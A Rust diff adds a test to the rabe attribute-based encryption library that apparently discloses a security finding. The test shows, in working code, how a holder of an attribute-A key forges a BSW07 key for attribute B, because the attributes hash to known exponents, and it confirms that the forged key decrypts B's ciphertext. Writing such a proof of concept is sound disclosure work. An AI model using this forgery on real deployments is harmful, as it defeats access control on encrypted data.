@@ -635,4 +635,46 @@ mod tests {
         assert_eq!(_match.is_ok(), true);
         assert_eq!(_match.unwrap(), plaintext);
     }
+
+    mod findings {
+        use super::*;
+
+        // BSW07 key parts are `D'_j = g^{r_j}` and `D_j = g^r * H(j)^{r_j}`. If you know `h_j` and
+        // `h_k` where `H(x) = g^{h_x}`, attribute `j` holders can make any key they like. This is
+        // not a theoretical weakness but an implementation one; the theory assumes use of a
+        // random oracle
+        #[test]
+        fn key_forgery() {
+            let (pk, msk) = setup();
+            let plaintext =
+                b"rabe is an Attribute Based Encryption library, written in Rust".to_vec();
+            let ct = encrypt(
+                &pk,
+                r#"{"name": "B"}"#,
+                PolicyLanguage::JsonPolicy,
+                &plaintext,
+            )
+            .unwrap();
+
+            let sk = keygen(&pk, &msk, &["A"]).unwrap();
+            assert!(
+                decrypt(&sk, &ct).is_err(),
+                "A key for A should not open a ciphertext for B"
+            );
+
+            let h_a = sha3_hash_fr("A").unwrap();
+            let h_b = sha3_hash_fr("B").unwrap();
+            let ratio = h_a * h_b.inverse().unwrap();
+            let d_a = &sk.d_j[0];
+            let forged = CpAbeSecretKey {
+                d: sk.d,
+                d_j: vec![CpAbeAttribute {
+                    string: String::from("B"),
+                    g1: d_a.g1 * ratio,
+                    g2: d_a.g2,
+                }],
+            };
+            assert_eq!(decrypt(&forged, &ct), Ok(plaintext));
+        }
+    }
 }
